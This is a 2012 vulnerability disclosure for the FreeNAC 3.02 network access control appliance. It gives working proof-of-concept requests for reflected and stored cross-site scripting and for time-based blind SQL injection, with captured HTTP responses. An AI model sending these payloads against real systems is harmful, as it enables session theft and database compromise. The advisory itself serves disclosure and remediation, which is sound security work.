@@ -1,0 +1,130 @@
+FreeNAC version 3.02 SQL Injection and XSS Vulnerabilties
+Date: May 19, 2012
+Author: Blake
+Software Link: http://sourceforge.net/project/showfiles.php?group_id=170004
+Version: 3.02
+Tested on: Ubuntu 8.04 (freenac version 3.02 vmware appliance)
+
+FreeNAC FreeNAC provides Virtual LAN assignment, LAN access control (for all kinds of network devices such as Servers, Workstations, Printers, IP-Phones ..), live network end-device discovery.Both 802.1x and Cisco's VMPS port security modes are supported. VLAN, switch port management and documentation of Patch cabling is also included.
+
+
+==========================================================================================================================================
+Reflective Cross-Site Scripting:
+Multiple parameters are vulnerable to reflective cross-site scripting.
+
+Affected Parameters:
+comment
+mac 
+graphtype
+type 
+name
+
+
+Example Request:
+GET /stats.php?graphtype=bar&type=vlan13<script>alert(1)</script> HTTP/1.1
+Host: 192.168.1.118
+User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Proxy-Connection: keep-alive
+Referer: http://192.168.1.118/stats.php?graphtype=bar&type=switch
+Cookie: freenac=92bcf3d911d94e33106c2e79745e8e8e
+
+Example Response:
+HTTP/1.1 200 OK
+Date: Sat, 19 May 2012 17:42:41 GMT
+Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5 with Suhosin-Patch
+X-Powered-By: PHP/5.2.4-2ubuntu5
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 5676
+Content-Type: text/html
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
+     "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+	  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+	  <title>FreeNAC :: Swisscom ::</title>
+	  <link href="bw.css" rel="stylesheet" type="text/css" />
+	</head>
+<a href='./index.html' title='Main Menu'><img src='./images/logo_small.png' border='0' /></a>
+
+
+..........snip......................
+
+<img src="statgraph.php?stattype=vlan13<script>alert(1)</script>&order=DESC&graphtype=bar"><br>
+<br>  <p class='UpdateMsg'>Database error</p>
+  <p>Please go <a HREF='javascript:javascript:history.go(-1)'>back to the previous screen</a>, or the 
+  <a href='./index.php' >Main Menu</a> and start again, or try again later.  </p>
+
+
+
+
+==========================================================================================================================================
+Stored Cross-Site Scripting:
+The comment parameter is vulnerable to stored cross-site scripting.
+
+Example Request:
+<changed from a POST to a GET>
+http://192.168.1.118/deviceadd.php?name=test&mac=0001.0001.0001&status=1&vlan=6&username=2&office=1&comment="><script>alert(2)</script>&action=Update&action_idx=1
+
+Example Response:
+HTTP/1.1 200 OK
+Date: Sat, 19 May 2012 17:53:38 GMT
+Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5 with Suhosin-Patch
+X-Powered-By: PHP/5.2.4-2ubuntu5
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 6945
+Content-Type: text/html
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
+     "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+	<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+	  <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+	  <title>FreeNAC :: Swisscom ::</title>
+	  <link href="bw.css" rel="stylesheet" type="text/css" />
+	</head>
+<a href='./index.html' title='Main Menu'><img src='./images/logo_small.png' border='0' /></a>
+
+.............snip.................
+
+</td></tr>
+         <tr><td>Switch:</td>
+           <td>, port= , location=  </td>
+           <td><input type="submit" name="action" class="bluebox" value="Restart Port" /> </td>
+         </tr> <tr><td>Comment:</td><td>
+<input name="comment" type="text" size=40 value=""><script>alert(2)</script>"/>
+</td><td>Last IP:NONE<br></td>
+<tr><td> </td><td></td></tr>
+          <tr><td> </td><td>
+          <input type="submit" name="action" class="bluebox" value="Update" /> 
+          <input type="submit" name="action" class="bluebox" value="Delete" 
+            onClick="javascript:return confirm('Really DELETE this end-device record?')"
+            />
+          </td></tr>'<tr><td> </td><td></td></tr>
+<tr><td> </td><td></td></tr>
+</table> <table id='t3-2' width='760' border='0' class='text13'><tr><td> </td><td></td></tr>
+<tr><td colspan=3 bgcolor="#DEDEDE"><b>Administrative information</b><tr><td>Inventory:<td>
+<tr><td>Classification:
+
+
+............snip....................
+
+
+
+
+
+==========================================================================================================================================
+SQL Injection:
+
+The status parameter is vulnerable to blind SQL Injection.
+Injecting a time-delay of 20 seconds:
+
+http://192.168.1.118/deviceadd.php?name=test&mac=0001.0001.0001&status=1+AND+SLEEP(20)&vlan=6&username=2&office=1&comment=&action=Update&action_idx=1
